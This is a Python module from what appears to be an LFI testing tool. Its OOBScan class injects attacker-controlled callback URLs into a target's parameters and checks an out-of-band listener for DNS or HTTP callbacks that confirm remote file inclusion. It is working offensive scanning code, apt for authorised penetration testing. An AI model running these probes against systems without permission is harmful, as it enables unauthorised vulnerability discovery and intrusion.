import urllib.parse

from .utils import attack, cook, parse_headers, parse_post_data
from .rich_output import colors, print_info, print_success, print_warning


class OOBScan:
    """Send payloads that may trigger out-of-band HTTP/DNS callbacks."""

    def __init__(self, args):
        self.target = args.url
        self.cookies = args.cookies
        self.oob_url = getattr(args, "oob_url", None)
        self.method = getattr(args, "method", "GET")
        self.custom_headers = parse_headers(getattr(args, "headers", None))
        self.post_data = parse_post_data(getattr(args, "post_data", None))

    def _payloads(self):
        callback = self.oob_url.rstrip("/")
        encoded_target = urllib.parse.quote(self.target, safe="")
        return [
            callback,
            f"{callback}/liffy-oob",
            f"{callback}/liffy-oob?target={encoded_target}",
            f"http://{urllib.parse.urlsplit(callback).netloc}/liffy-oob",
        ]

    def execute_oob_scan(self):
        if not self.oob_url:
            print_warning("OOB scan skipped: provide --oob-url")
            return []

        print(colors("[~] Testing out-of-band wrapper callbacks", 93))
        cookies = cook(self.cookies) if self.cookies else None
        sent = []

        for payload in dict.fromkeys(self._payloads()):
            print_info(f"Sending OOB probe: {payload}")
            response = attack(
                self.target,
                payload,
                cookies=cookies,
                detection_mode=True,
                method=self.method,
                post_data=self.post_data,
                custom_headers=self.custom_headers,
            )
            sent.append(
                {
                    "payload": payload,
                    "status_code": response.status_code if response else None,
                    "note": "Check your OOB listener for DNS/HTTP callbacks",
                }
            )

        print_success("OOB probes sent; verify callbacks in your listener")
        return sent
